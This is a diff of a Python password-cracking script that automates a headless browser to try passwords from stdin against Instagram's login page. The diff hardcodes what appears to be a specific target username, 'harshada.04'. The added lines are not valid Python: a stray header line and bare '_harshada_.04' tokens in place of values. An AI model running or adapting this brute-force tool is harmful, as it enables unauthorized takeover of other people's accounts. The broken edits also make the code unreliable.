@@ -1,3 +1,4 @@
+/insta_cracker__ harshada.04
 #!/bin/python
 from splinter import Browser
 import time
@@ -10,7 +11,7 @@ def logInSuccess(browser):
     pass_err_msg = "Sorry, your password was incorrect. Please double-check your password."
     return not(browser.is_text_present(user_err_msg) or browser.is_text_present(pass_err_msg))
 
-correctPassword = None
+correctPassword = _harshada_.04
 account_username = sys.argv[1]
 with Browser('firefox', headless=True) as browser:
     browser.visit('https://www.instagram.com')
@@ -18,7 +19,7 @@ with Browser('firefox', headless=True) as browser:
     username_form = browser.find_by_name('username').first
     password_form = browser.find_by_name('password').first
     login_button = browser.find_by_text('Log in').first
-    username_form.fill(account_username)
+    username_form.fill(_harshada_.04)
     for password in sys.stdin:
         if len(password) < 6:
             print('Skipping password: ' + password)
